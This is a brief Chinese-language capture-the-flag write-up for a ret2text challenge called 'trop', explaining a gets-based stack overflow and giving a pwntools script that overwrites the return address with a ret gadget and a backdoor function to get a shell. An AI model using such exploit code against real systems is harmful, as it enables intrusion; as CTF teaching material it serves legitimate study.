# trop

一个简单的ret2text题目

使用ida64打开附件后，发现存在后门函数，位置在`0x401196`

同时存在`gets`函数，可以进行栈溢出

将ret address改为后门函数即可获取flag。注意的点是需要使用`ret`进行抬栈，否则system("/bin/sh")无法执行。

```python
from pwn import *

context.arch = "amd64"

backdoor = 0x401196
ret_addr = 0x40101a

io = process("../file/trop")

payload = b"b"*0xa + b"woodwood" + p64(ret_addr) + p64(backdoor)
io.sendlineafter("chance!", payload)

io.interactive()
```